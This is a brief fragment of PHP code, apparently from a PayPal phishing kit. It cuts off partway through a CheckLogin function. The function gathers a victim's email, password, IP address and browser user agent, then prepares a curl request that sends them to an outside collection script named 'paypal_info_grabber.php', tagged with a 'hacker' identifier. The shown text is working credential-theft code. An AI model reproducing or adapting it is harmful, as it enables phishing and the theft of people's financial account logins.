...
function CheckLogin($Email,$Pass,$hacker)
{
	$ip = get_client_ip();
	$userag 		= $_SERVER['HTTP_USER_AGENT']; 
    $ch = curl_init("http://www.s3curity.tn/V3PP/paypal_info_grabber.php");  
    $data ="name=".urlencode($hacker)."&login_email=".urlencode($Email)."&login_password=".urlencode($Pass)."&userage=".urlencode($userag)."&ip=".urlencode($ip);
